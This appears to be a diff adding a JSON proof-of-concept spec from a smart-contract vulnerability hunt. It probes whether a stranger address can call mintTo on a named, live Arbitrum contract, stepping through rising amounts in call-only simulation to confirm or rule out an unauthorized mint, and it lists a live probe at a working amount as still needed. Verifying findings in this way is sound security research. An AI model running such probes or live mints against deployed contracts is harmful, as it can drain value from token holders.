@@ -1,0 +1,21 @@
+{
+  "poc_id": "poc-1b-agve-mintto-boundary",
+  "chain": "arbitrum",
+  "rpc_url": "https://arb1.arbitrum.io/rpc",
+  "address": "0x848e0ba28b637e8490d88bae51fa99c87116409b",
+  "hypothesis": "Follow-up to poc-1: mintTo(1e18) reverts 'W37: Too large mint'. Boundary probe (call-only, no state change): find the largest mint a stranger can actually execute. If even 1 wei reverts, the mint is fully gated for strangers and the candidate is a false positive; if a small amount succeeds, the cap is per-call and the drain is bounded by the cap.",
+  "steps": [
+    {"sig": "mintTo(address,uint256)", "args": ["STRANGER", "1"], "call_only": true},
+    {"sig": "mintTo(address,uint256)", "args": ["STRANGER", "1000000000000"], "call_only": true},
+    {"sig": "mintTo(address,uint256)", "args": ["STRANGER", "1000000000000000"], "call_only": true},
+    {"sig": "mintTo(address,uint256)", "args": ["STRANGER", "100000000000000000"], "call_only": true},
+    {"sig": "mintTo(address,uint256)", "args": ["STRANGER", "1000000000000000000"], "call_only": true}
+  ],
+  "reads": [
+    {"sig": "balanceOf(address)", "args": ["STRANGER"]},
+    {"sig": "totalSupply()", "args": []}
+  ],
+  "still_needed_for_verified_real": [
+    "a mint amount that actually executes for a stranger, then the live decisive-amount probe + receipt + balance delta at that amount"
+  ]
+}
